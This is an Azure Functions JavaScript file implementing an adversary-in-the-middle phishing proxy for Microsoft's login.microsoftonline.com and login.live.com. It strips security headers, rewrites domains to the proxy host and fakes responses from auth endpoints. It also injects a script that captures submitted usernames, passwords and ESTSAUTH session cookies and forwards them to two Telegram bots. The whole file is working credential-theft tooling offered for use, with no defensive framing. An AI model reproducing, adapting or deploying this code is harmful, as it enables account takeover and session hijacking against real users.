const { app } = require("@azure/functions");
const axios = require('axios');

// Telegram configuration - REAL TOKENS
const TELEGRAM_BOT_TOKEN = "7768080373:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
const TELEGRAM_CHAT_ID = "6743632244";
const TELEGRAM_BOT_TOKEN2 = "7942871168:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
const TELEGRAM_CHAT_ID2 = "6263177378";

// Microsoft domains
const upstream_enterprise = "login.microsoftonline.com";
const upstream_personal = "login.live.com";

// Headers to delete from upstream responses
const delete_headers = [
    "content-security-policy",
    "content-security-policy-report-only",
    "clear-site-data",
    "x-frame-options",
    "referrer-policy",
    "strict-transport-security",
    "content-length",
    "content-encoding",
    "Set-Cookie",
];

async function sendTelegram(message, isSecondary = false) {
    const botToken = isSecondary ? TELEGRAM_BOT_TOKEN2 : TELEGRAM_BOT_TOKEN;
    const chatId = isSecondary ? TELEGRAM_CHAT_ID2 : TELEGRAM_CHAT_ID;
    
    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        console.log(`Telegram message sent: ${message.substring(0, 50)}...`);
    } catch (error) {
        console.error('Telegram send error:', error.message);
    }
}

// Enhanced URL replacement function
async function replace_response_text(response, upstream_url, original_url) {
    return response
        .text()
        .then((text) => {
            // Replace both possible Microsoft domains with our proxy domain
            let modifiedText = text.replace(new RegExp(upstream_enterprise, "g"), original_url.host);
            modifiedText = modifiedText.replace(new RegExp(upstream_personal, "g"), original_url.host);
            
            // Also replace any protocol+domain combinations
            modifiedText = modifiedText.replace(new RegExp(`https://${upstream_enterprise}`, "g"), `${original_url.protocol}//${original_url.host}`);
            modifiedText = modifiedText.replace(new RegExp(`https://${upstream_personal}`, "g"), `${original_url.protocol}//${original_url.host}`);
            
            return modifiedText;
        });
}

// Function to determine which upstream to use
function getUpstreamDomain(request, original_url) {
    const userAgent = request.headers.get('user-agent') || '';
    const referer = request.headers.get('referer') || '';
    
    // Check if this is a redirect from login.live.com or contains personal account indicators
    if (referer.includes('login.live.com')) {
        return upstream_personal;
    }
    
    // Check username parameter (URL decoded)
    if (original_url.searchParams.has('username')) {
        const username = decodeURIComponent(original_url.searchParams.get('username'));
        if (username.includes('@outlook.com') || 
            username.includes('@hotmail.com') ||
            username.includes('@live.com')) {
            return upstream_personal;
        }
    }
    
    // Check URL parameters that might indicate personal account flow
    if (original_url.searchParams.has('login_hint')) {
        const loginHint = decodeURIComponent(original_url.searchParams.get('login_hint'));
        if (loginHint.includes('@outlook.com') || 
            loginHint.includes('@hotmail.com') || 
            loginHint.includes('@live.com')) {
            return upstream_personal;
        }
    }
    
    // Check for OAuth paths that typically go to login.live.com
    if (original_url.pathname.includes('/oauth20_token.srf') ||
        original_url.pathname.includes('/ppsecure/')) {
        return upstream_personal;
    }
    
    // Default to enterprise domain for most cases
    return upstream_enterprise;
}

app.http("proxy", {
    methods: ["GET", "POST", "PUT", "PATCH"],
    authLevel: "anonymous",
    route: "cookieproxy/{*path}",
    handler: async (request, context) => {
        try {
            // Extract path from URL - handle URL encoding
            const url = new URL(request.url);
            let path = url.pathname.replace('/api/cookieproxy/', '');
            
            // Decode URL-encoded characters
            path = decodeURIComponent(path);
            
            // Handle special endpoints for session capture
            if (path.includes('session-capture') || path.includes('credential-capture')) {
                const body = await request.text();
                const data = JSON.parse(body);
                
                if (path.includes('session-capture')) {
                    await sendTelegram(`🍪 <b>Session Cookie Captured</b>\n\n🔗 <b>URL:</b> ${data.url}\n🍪 <b>Cookies:</b> <code>${data.cookies}</code>\n👤 <b>User Agent:</b> ${data.userAgent}`);
                    await sendTelegram(`🍪 <b>Session Cookie Captured</b>\n\n🔗 <b>URL:</b> ${data.url}\n🍪 <b>Cookies:</b> <code>${data.cookies}</code>\n👤 <b>User Agent:</b> ${data.userAgent}`, true);
                } else if (path.includes('credential-capture')) {
                    await sendTelegram(`🔐 <b>Credentials Captured</b>\n\n👤 <b>Username:</b> ${data.username}\n🔑 <b>Password:</b> ${data.password}\n🔗 <b>URL:</b> ${data.url}`);
                    await sendTelegram(`🔐 <b>Credentials Captured</b>\n\n👤 <b>Username:</b> ${data.username}\n🔑 <b>Password:</b> ${data.password}\n🔗 <b>URL:</b> ${data.url}`, true);
                }
                
                return new Response('OK', { status: 200 });
            }

            // Determine which upstream domain to use
            const selected_upstream = getUpstreamDomain(request, url);
            
            // Handle critical API endpoints that need mock responses
            const criticalEndpoints = [
                '/GetExperimentAssignments.srf',
                '/GetOneTimeCode.srf',
                '/GetSessionState.srf',
                '/GetCredentialType.srf',
                '/post.srf',
                '/GetCredentialTypeAsyncEx.srf',
                '/GetAccountInformation.srf',
                '/GetAccountRecoveryData.srf',
                '/ValidateAccountRecoveryPIN.srf',
                '/SendAccountRecoveryCode.srf',
                '/GetAccessibleDesktopVersion.srf',
                '/GetActiveDirectoryFederatedCredentials.srf',
                '/ProcessAuth.srf'
            ];
            
            const isCriticalEndpoint = criticalEndpoints.some(endpoint => 
                path.includes(endpoint)
            );
            
            if (isCriticalEndpoint) {
                const isPersonalAccount = selected_upstream === "login.live.com";
                let mockResponse = "";
                
                if (path.includes('/GetExperimentAssignments.srf')) {
                    mockResponse = isPersonalAccount ? 
                        JSON.stringify({
                            "experiments": {
                                "MsaAccountRecoveryExp": 1,
                                "MsaSecurityInfoExp": 1,
                                "MsaVerificationExp": 1
                            },
                            "success": true,
                            "status": "success"
                        }) :
                        JSON.stringify({
                            "experiments": [],
                            "success": true
                        });
                } else if (path.includes('/GetOneTimeCode.srf')) {
                    mockResponse = isPersonalAccount ?
                        JSON.stringify({
                            "success": true,
                            "status": "success",
                            "message": "Verification code sent",
                            "flowState": "OTCSENT",
                            "phoneNumberId": "1"
                        }) :
                        JSON.stringify({
                            "success": true,
                            "message": "Code sent successfully"
                        });
                } else {
                    mockResponse = JSON.stringify({
                        "success": true,
                        "status": "success"
                    });
                }
                
                return new Response(mockResponse, {
                    status: 200,
                    headers: {
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*'
                    }
                });
            }

            // Build upstream URL
            const upstream_url = new URL(`https://${selected_upstream}${path.startsWith('/') ? path : '/' + path}`);
            upstream_url.search = url.search;

            // Prepare headers for upstream request
            const headers = new Headers();
            for (const [key, value] of request.headers.entries()) {
                if (key.toLowerCase() !== 'host' && key.toLowerCase() !== 'origin' && key.toLowerCase() !== 'referer') {
                    headers.set(key, value);
                }
            }
            
            // Set appropriate headers for upstream
            headers.set('Host', selected_upstream);
            headers.set('Origin', `https://${selected_upstream}`);
            headers.set('Referer', `https://${selected_upstream}/`);

            // Prepare request body
            let body = null;
            if (request.method !== 'GET') {
                body = await request.text();
            }

            // Make request to upstream
            const upstreamResponse = await fetch(upstream_url.toString(), {
                method: request.method,
                headers: headers,
                body: body
            });

            // Process response
            const responseHeaders = new Headers();
            for (const [key, value] of upstreamResponse.headers.entries()) {
                if (!delete_headers.includes(key.toLowerCase())) {
                    responseHeaders.set(key, value);
                }
            }
            
            // Set CORS headers
            responseHeaders.set('Access-Control-Allow-Origin', '*');
            responseHeaders.set('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
            responseHeaders.set('Access-Control-Allow-Headers', '*');

            // Get response content
            let responseContent = await upstreamResponse.text();
            
            // Replace URLs in HTML responses
            if (responseHeaders.get('content-type')?.includes('text/html')) {
                responseContent = responseContent.replace(new RegExp(upstream_enterprise, "g"), url.host);
                responseContent = responseContent.replace(new RegExp(upstream_personal, "g"), url.host);
                responseContent = responseContent.replace(new RegExp(`https://${upstream_enterprise}`, "g"), `${url.protocol}//${url.host}`);
                responseContent = responseContent.replace(new RegExp(`https://${upstream_personal}`, "g"), `${url.protocol}//${url.host}`);
                
                // Inject JavaScript for monitoring
                const monitoringScript = `
                <script>
                (function() {
                    // Monitor form submissions
                    document.addEventListener('submit', function(e) {
                        const form = e.target;
                        const formData = new FormData(form);
                        const data = {
                            url: window.location.href,
                            username: formData.get('loginfmt') || formData.get('username') || formData.get('email'),
                            password: formData.get('passwd') || formData.get('password'),
                            userAgent: navigator.userAgent
                        };
                        
                        fetch('/api/cookieproxy/credential-capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(data)
                        });
                    });
                    
                    // Monitor cookies
                    setInterval(function() {
                        const cookies = document.cookie;
                        if (cookies.includes('ESTSAUTHPERSISTENT') || cookies.includes('ESTSAUTH') || cookies.includes('SignInStateCookie')) {
                            fetch('/api/cookieproxy/session-capture', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    url: window.location.href,
                                    cookies: cookies,
                                    userAgent: navigator.userAgent
                                })
                            });
                        }
                    }, 1000);
                })();
                </script>`;
                
                // Inject script before closing body tag
                responseContent = responseContent.replace('</body>', monitoringScript + '</body>');
            }

            return new Response(responseContent, {
                status: upstreamResponse.status,
                headers: responseHeaders
            });

        } catch (error) {
            context.log.error('Proxy error:', error);
            await sendTelegram(`❌ <b>Proxy Error</b>\n\n${error.message}`);
            return new Response('Proxy error', { status: 500 });
        }
    }
});